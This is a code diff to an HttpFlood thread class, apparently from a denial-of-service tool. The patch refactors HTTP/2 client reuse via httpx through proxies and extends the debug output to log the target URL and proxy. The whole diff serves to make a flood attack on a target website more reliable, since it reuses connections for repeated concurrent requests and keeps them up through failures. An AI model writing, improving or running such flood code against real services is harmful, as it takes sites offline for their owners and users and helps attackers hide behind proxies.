@@ -1612,7 +1612,8 @@ class HttpFlood(Thread):
 
         try:
             # [PHASE 10] Reuse client if possible to prevent overhead
-            if not hasattr(self, '_h2_client') or self._h2_client.is_closed:
+            client = getattr(self, '_h2_client', None)
+            if client is None or client.is_closed:
                 # [DEBUG] Optional: print(f"[DEBUG] H2 Thread {self._thread_id} connecting to {clean_target_url} via {proxy_url}")
                 self._h2_client = httpx.Client(
                     http2=True,
@@ -1621,8 +1622,7 @@ class HttpFlood(Thread):
                     headers=headers,
                     timeout=5.0 # Increased timeout for slow proxies
                 )
-            
-            client = self._h2_client
+                client = self._h2_client
             # HTTP/2 allows multiple concurrent requests on 1 connection
             # We use a smaller internal loop to report back more frequently
             for _ in range(5): 
@@ -1647,10 +1647,11 @@ class HttpFlood(Thread):
         except Exception as e:
             # [DEBUG] Report error for diagnosis
             if int(REQUESTS_SENT) < 100: # [FIX] Counter must be cast to int for comparison
-                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG ERROR] H2_FLOOD: {str(e)[:100]}")
+                 err_msg = str(e)[:100]
+                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG ERROR] H2_FLOOD: {err_msg} | Target: {clean_target_url} | Proxy: {proxy_url}")
             
             # If client fails, close it so it recreates next time
-            if hasattr(self, '_h2_client'):
+            if getattr(self, '_h2_client', None) is not None:
                 try: self._h2_client.close()
                 except: pass
                 self._h2_client = None
